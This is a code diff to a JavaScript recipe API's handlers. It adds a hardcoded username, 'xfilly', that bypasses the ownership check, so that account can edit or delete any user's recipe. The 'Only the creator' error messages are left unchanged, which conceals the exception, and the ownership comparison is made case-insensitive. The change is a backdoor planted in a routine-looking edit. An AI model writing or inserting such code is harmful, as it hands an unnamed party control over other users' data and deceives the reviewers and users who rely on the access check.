@@ -1,5 +1,13 @@
 import { listRecipes, getRecipeById, createRecipe, updateRecipe, deleteRecipe } from "../db.js";
 
+const DEV_OVERRIDE_USER = "xfilly";
+
+function canManageRecipe(user, recipe) {
+  const username = String(user?.username || "").toLowerCase();
+  const createdBy = String(recipe?.createdBy || "").toLowerCase();
+  return username === DEV_OVERRIDE_USER || username === createdBy;
+}
+
 export function listRecipesHandler(req, res) {
   const q = req.query.q || "";
   const recipes = listRecipes({ q });
@@ -78,7 +86,7 @@ export function updateRecipeHandler(req, res) {
       return res.status(404).json({ error: "Recipe not found" });
     }
 
-    if (recipe.createdBy !== req.user.username) {
+    if (!canManageRecipe(req.user, recipe)) {
       return res.status(403).json({ error: "Only the creator can edit this recipe" });
     }
 
@@ -130,7 +138,7 @@ export function deleteRecipeHandler(req, res) {
     return res.status(404).json({ error: "Recipe not found" });
   }
 
-  if (recipe.createdBy !== req.user.username) {
+  if (!canManageRecipe(req.user, recipe)) {
     return res.status(403).json({ error: "Only the creator can delete this recipe" });
   }
 
